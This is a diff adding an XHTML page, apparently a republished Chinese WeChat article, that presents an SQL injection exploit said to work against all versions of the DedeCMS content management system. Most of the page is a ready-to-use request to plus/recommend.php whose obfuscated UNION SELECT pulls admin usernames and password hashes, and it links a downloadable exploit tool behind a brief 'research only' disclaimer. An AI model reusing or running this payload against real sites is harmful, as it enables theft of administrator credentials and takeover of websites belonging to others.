@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>DedeCMS全版本通杀SQL注入漏洞利用代码及工具</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>DedeCMS全版本通杀SQL注入漏洞利用代码及工具</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/mp/appmsg/show?__biz=MjM5NjA0NjgyMA==&amp;appmsgid=200058988&amp;itemidx=3&amp;sign=2b30d1c265ef3689c9aa278939541d04&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/mp/appmsg/show?__biz=MjM5NjA0NjgyMA==&amp;appmsgid=200058988&amp;itemidx=3&amp;sign=2b30d1c265ef3689c9aa278939541d04&amp;scene=27#wechat_redirect</a></blockquote><p style="">dedecms即织梦（PHP开源网站内容管理系统）。织梦内容管理系统(DedeCms) 以简单、实用、开源而闻名，是国内最知名的PHP开源网站管理系统，也是使用用户最多的PHP类CMS系统，<strong style="margin: 0px; padding: 0px;">近日，网友在dedecms中发现了全版本通杀的SQL注入漏洞，目前官方最新版已修复该漏洞，相关利用代码如下：</strong></p><p style=""><strong style="margin: 0px; padding: 0px;"><br/></strong></p><p style="">EXP:</p><pre class="prettyprint lang-html prettyprinted" style="margin-top: 0px; margin-bottom: 0px; padding: 8px; background-color: rgb(247, 247, 249); border: 1px solid rgb(225, 225, 232); white-space: pre-wrap; word-break: break-all; word-wrap: break-word; color: rgb(102, 102, 102); font-size: 13px; line-height: 24px;">Exp:plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\'
+  or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,(select  
+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin` 
+limit+0,1),5,6,7,8,9%23@`\'`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type]
+ [type]=application/octet-stream&amp;_FILES[type][size]=111</pre><p style=""><br/></p><p style="">利用工具源码by园长（点击下方“阅读原文”查看）</p><p style=""><br/></p><p style="">利用工具下载地址 http://pan.baidu.com/s/1sj31RLN (<span style="margin: 0px; padding: 0px; color: rgb(192, 0, 0);"><strong style="margin: 0px; padding: 0px;">本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!</strong></span>)</p><p style=""><br/></p><p><img src="../Images/61b4f92bdaae63fb4b0b50cac653812d.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/qq5rfBadR3icQQMEOFicicibc0SL9YLVMjqd26BzvjnCWNNJ2aVr3l53ZX3apeI6tSNAYJ6PgOmJ0tYcIyZJ1XB9cQ/0"/></p>
+        
+</body>
+</html>
